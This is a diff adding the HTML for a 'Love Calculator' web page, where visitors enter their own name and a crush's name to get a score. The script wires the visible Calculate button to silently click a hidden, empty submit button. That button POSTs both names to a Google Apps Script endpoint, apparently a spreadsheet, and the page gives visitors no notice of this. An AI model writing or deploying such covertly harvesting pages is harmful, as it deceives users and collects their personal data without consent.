@@ -1,0 +1,126 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0" />
+    <link rel="stylesheet" href="style.css" />
+    <title>Love Calculator</title>
+  </head>
+  <body>
+    <form name="submit-to-google-sheet">
+    <div class="wrapper">
+      <div class="heading">
+        <h1>Love ♥ Calculator</h1>
+        <h4>Get Your Own Love Result Instantly</h4>
+      </div>
+
+      <div class="maincontent">
+        <div>
+          <!-- Your name Input field -->
+          <label for="yourname">Your Name</label><br />
+          <input
+            type="text"
+            id="yourname"
+            name="yname"
+            placeholder="Enter Your Name"
+            spellcheck="false"
+            maxlength="30"
+            required
+          />
+        </div>
+        <div>
+          <!-- His/Her name Input field -->
+          <label for="theirname">His/Her Name</label><br />
+          <input
+            type="text"
+            id="theirname"
+            name="tname"
+            placeholder="Enter His/Her Name"
+            spellcheck="false"
+            maxlength="30"
+            required
+          />
+        </div>
+      </div class="clickButtons">
+      <br><br>
+      <button type="button" id="submit">❤ CALCULATE ❤</button><br>
+
+      
+      <button type="submit" id="btn2"></button>
+      
+    
+    
+      <div class="result">
+        <h2>Result</h2>
+        <div class="divider"></div>
+        <p id="yourlovescoreis"></p>
+        <h1 id="score"></h1>
+        <p id="loveinfo"></p>
+        <p
+          id="reload"
+          style="
+            cursor: pointer;
+            display: none;
+            margin-top: 30px;
+            font-weight: 700;
+          "
+          onClick="window.location.reload();"
+        >
+          ↺ Re Calculate
+        </p>
+      </div>
+    </div>
+    <div class="footer">
+      <p style="color: #000; font-size: 35px">
+        Made With <span style="color: #ff4136; font-size: 35px">❤</span> By
+        <a
+          style="text-decoration: none; font-weight: bold; color: #ff4136"
+          target="_blank"
+          href="https://www.instagram.com/jamdar_akash"
+          >Akash</a
+        >
+        <br />
+       
+      </p>
+    </div>
+    </form>
+    
+    <script>
+
+      
+      const scriptURL = 'https://script.google.com/macros/s/AKfycbwwpL5MYSS801azqyWHXmrRefPmrMdg3Ck3_gv_RGa_hbH1vXTH1cdgPIKCZq8uaOcN/exec'
+      const form = document.forms['submit-to-google-sheet']
+    
+      form.addEventListener('submit', e => {
+        e.preventDefault()
+        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+          .then(response => console.log('Success!', response))
+          .catch(error => console.error('Error!', error.message))
+      })
+</script>
+<script src="love.js"></script>
+
+
+<script>
+  // Get references to the buttons
+  const submit = document.getElementById('submit');
+  const btn2 = document.getElementById('btn2');
+ 
+
+  // Function to handle Button 1 click
+  submit.onclick = function() {console.log("Success")
+      // Trigger automatic clicks for Button 2 and Button 3
+      btn2.click();
+      
+  };
+
+  // Optional: Add functionality for Button 2 
+  btn2.onclick = function() { console.log("Success")
+      // Handle Button 2 click here
+ 
+  };
+</script>
+    
+
+  </body>
+</html>
